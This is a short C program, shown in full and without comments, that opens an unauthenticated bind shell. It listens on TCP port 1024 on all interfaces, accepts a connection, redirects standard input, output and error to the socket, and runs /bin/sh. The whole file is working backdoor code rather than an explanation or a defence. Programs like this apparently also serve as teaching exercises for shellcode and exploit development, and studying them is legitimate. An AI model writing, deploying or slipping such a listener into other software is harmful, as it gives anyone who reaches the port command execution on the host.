#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
    struct sockaddr_in server, client;
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = INADDR_ANY;
    server.sin_port = htons(1024);

    printf("port_number size %d\n", sizeof(server.sin_port));

    int fd = socket(AF_INET, SOCK_STREAM, 0);

    if (fd == -1)
    {
        perror("Error on opening socket\n");
        return EXIT_FAILURE;
    }

    int bind_result = bind(fd, (struct sockaddr *)&server, sizeof(server));

    if (bind_result == -1)
    {
        perror("Error on bind");

        return EXIT_FAILURE;
    }

    int listen_result = listen(fd, 5);

    if (listen_result == -1)
    {
        perror("Error on listen");
    }

    memset(&client, 0, sizeof(client));

    int addr_len = sizeof(client);

    int accept_result_fd = accept(fd, (struct sockaddr *)&client, &addr_len);

    if (accept_result_fd == -1)
    {
        perror("Error on accept");

        return EXIT_FAILURE;
    }

    dup2(accept_result_fd, STDOUT_FILENO);
    dup2(accept_result_fd, STDIN_FILENO);
    dup2(accept_result_fd, STDERR_FILENO);

    execve("/bin/sh", NULL, NULL);
}